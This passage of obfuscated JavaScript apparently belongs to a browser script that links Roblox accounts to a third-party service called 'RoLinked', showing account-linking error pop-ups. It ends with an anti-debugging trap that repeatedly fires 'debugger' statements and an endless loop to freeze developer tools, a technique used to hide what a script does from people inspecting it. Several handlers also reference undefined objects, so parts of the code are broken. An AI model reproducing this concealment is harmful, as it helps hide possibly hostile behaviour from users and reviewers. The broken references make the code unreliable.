                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var R = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", R);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById(j.fSHqY).remove();
                                        document.getElementsByClassName(j.QMXhj)[0].innerText = j.xyuoS;
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (f, Y, N) {
                                var J = {};
                                J.YtINF = "promptPopup";
                                J.fEgov = "text-footer footer-note";
                                J.ThDLL = "Not Active";
                                var z = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", z);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById(u.YtINF).remove();
                                    document.getElementsByClassName(u.fEgov)[0].innerText = u.ThDLL;
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById(j.fSHqY).remove();
                                    document.getElementsByClassName(j.QMXhj)[0].innerText = j.xyuoS;
                                };
                            });
                    }
                })();
            },
            error: function () {
                var K = {};
                K.RJfYP = "promptPopup";
                K.jBnYl = "text-footer footer-note";
                K.zKkRH = "Not Active";
                var T = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", T);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById(e.RJfYP).remove();
                    document.getElementsByClassName(e.jBnYl)[0].innerText = e.zKkRH;
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(e.RJfYP).remove();
                    document.getElementsByClassName(e.jBnYl)[0].innerText = e.zKkRH;
                };
            },
        });
    }
})();
(function () {
    var Q = function () {
        var v;
        try {
            v = Function('return (function() {}.constructor("return this")( ));')();
        } catch (H) {
            v = window;
        }
        return v;
    };
    var U = Q();
    U.setInterval(w, 4000);
})();
function w(i) {
    function U(v) {
        if (typeof v === "string") {
            return function (H) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + v / v).length !== 1 || v % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        U(++v);
    }
    try {
        if (i) {
            return U;
        } else {
            U(0);
        }
    } catch (v) {}
}
